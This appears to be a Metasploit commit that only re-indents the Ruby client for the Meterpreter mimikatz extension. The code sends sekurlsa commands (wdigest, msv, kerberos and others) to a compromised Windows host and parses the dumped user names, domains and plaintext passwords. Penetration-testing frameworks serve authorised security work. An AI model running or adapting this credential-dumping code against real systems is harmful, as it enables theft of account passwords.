daed98931e8e2e9b029863dd22e8764a201b0b39
Tab Assassin <tabassassin@metasploit.com>
2013-09-05 14:19:55 -0500

    Retab changes for PR #2158

--- lib/rex/post/meterpreter/extensions/mimikatz/mimikatz.rb
+++ lib/rex/post/meterpreter/extensions/mimikatz/mimikatz.rb
@@ -22,103 +22,103 @@ module Mimikatz
 
 class Mimikatz < Extension
 
-	def initialize(client)
-		super(client, 'mimikatz')
+  def initialize(client)
+    super(client, 'mimikatz')
 
-		client.register_extension_aliases(
-			[
-				{
-					'name' => 'mimikatz',
-					'ext'  => self
-				},
-			])
-	end
+    client.register_extension_aliases(
+      [
+        {
+          'name' => 'mimikatz',
+          'ext'  => self
+        },
+      ])
+  end
 
-	def send_custom_command(function, args=[])
-		request = Packet.create_request('mimikatz_custom_command')
-		request.add_tlv(TLV_TYPE_MIMIKATZ_FUNCTION, function)
-		args.each do |a|
-			request.add_tlv(TLV_TYPE_MIMIKATZ_ARGUMENT, a)
-		end
-		response = client.send_request(request)
-		return Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
-	end
+  def send_custom_command(function, args=[])
+    request = Packet.create_request('mimikatz_custom_command')
+    request.add_tlv(TLV_TYPE_MIMIKATZ_FUNCTION, function)
+    args.each do |a|
+      request.add_tlv(TLV_TYPE_MIMIKATZ_ARGUMENT, a)
+    end
+    response = client.send_request(request)
+    return Rex::Text.to_ascii(response.get_tlv_value(TLV_TYPE_MIMIKATZ_RESULT))
+  end
 
-	def parse_creds_result(result)
-		details = CSV.parse(result)
-		accounts  =  []
-		details.each do |acc|
-			account = {
-				:authid => acc[0],
-				:package => acc[1],
-				:user => acc[2],
-				:domain => acc[3],
-				:password => acc[4]
-			}
-			accounts << account
-		end
-		return accounts
-	end
+  def parse_creds_result(result)
+    details = CSV.parse(result)
+    accounts  =  []
+    details.each do |acc|
+      account = {
+        :authid => acc[0],
+        :package => acc[1],
+        :user => acc[2],
+        :domain => acc[3],
+        :password => acc[4]
+      }
+      accounts << account
+    end
+    return accounts
+  end
 
-	def parse_ssp_result(result)
-		details = CSV.parse(result)
-		accounts = []
+  def parse_ssp_result(result)
+    details = CSV.parse(result)
+    accounts = []
 
-		return accounts unless details
-		details.each do |acc|
-			next unless acc.length == 5
-			ssps = acc[4].split(' }')
-			next unless ssps
-			ssps.each do |ssp|
-				next unless ssp
-				s_acc = ssp.split(' ; ')
-				next unless s_acc
-				user = s_acc[0].split('{ ')[1]
-				next unless user
-				account = {
-					:authid => acc[0],
-					:package => acc[1],
-					:user => user,
-					:domain => s_acc[1],
-					:password => s_acc[2],
-					:orig_user => acc[2],
-					:orig_domain => acc[3]
-				}
-				accounts << account
-			end
-		end
-		return accounts
-	end
+    return accounts unless details
+    details.each do |acc|
+      next unless acc.length == 5
+      ssps = acc[4].split(' }')
+      next unless ssps
+      ssps.each do |ssp|
+        next unless ssp
+        s_acc = ssp.split(' ; ')
+        next unless s_acc
+        user = s_acc[0].split('{ ')[1]
+        next unless user
+        account = {
+          :authid => acc[0],
+          :package => acc[1],
+          :user => user,
+          :domain => s_acc[1],
+          :password => s_acc[2],
+          :orig_user => acc[2],
+          :orig_domain => acc[3]
+        }
+        accounts << account
+      end
+    end
+    return accounts
+  end
 
-	def wdigest
-		result = send_custom_command('sekurlsa::wdigest')
-		return parse_creds_result(result)
-	end
+  def wdigest
+    result = send_custom_command('sekurlsa::wdigest')
+    return parse_creds_result(result)
+  end
 
-	def msv
-		result = send_custom_command('sekurlsa::msv')
-		return parse_creds_result(result)
-	end
+  def msv
+    result = send_custom_command('sekurlsa::msv')
+    return parse_creds_result(result)
+  end
 
-	def livessp
-		result = send_custom_command('sekurlsa::livessp')
-		return parse_creds_result(result)
-	end
+  def livessp
+    result = send_custom_command('sekurlsa::livessp')
+    return parse_creds_result(result)
+  end
 
-	def ssp
-		result = send_custom_command('sekurlsa::ssp')
-		return parse_ssp_result(result)
-	end
+  def ssp
+    result = send_custom_command('sekurlsa::ssp')
+    return parse_ssp_result(result)
+  end
 
-	def tspkg
-		result = send_custom_command('sekurlsa::tspkg')
-		return parse_creds_result(result)
-	end
+  def tspkg
+    result = send_custom_command('sekurlsa::tspkg')
+    return parse_creds_result(result)
+  end
 
-	def kerberos
-		result = send_custom_command('sekurlsa::kerberos')
-		return parse_creds_result(result)
-	end
+  def kerberos
+    result = send_custom_command('sekurlsa::kerberos')
+    return parse_creds_result(result)
+  end
 end
 
 end; end; end; end; end
